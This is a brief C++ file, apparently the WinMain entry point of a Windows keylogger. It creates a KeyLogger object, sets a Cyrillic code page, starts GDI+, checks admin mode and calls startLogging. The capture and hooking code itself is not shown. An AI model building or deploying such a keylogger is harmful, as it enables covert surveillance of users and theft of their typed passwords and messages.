#include "KeyLogger.hpp"


KeyLogger keyLogger{};


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow) {
    system("chcp 1251");
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    SYSTEMTIME CurTime;
    GetLocalTime(&CurTime);
    srand(CurTime.wMilliseconds);
    
  
    keyLogger.checkAdminMode(hInstance);
    keyLogger.startLogging();


    Gdiplus::GdiplusShutdown(gdiplusToken);

    return EXIT_SUCCESS;
}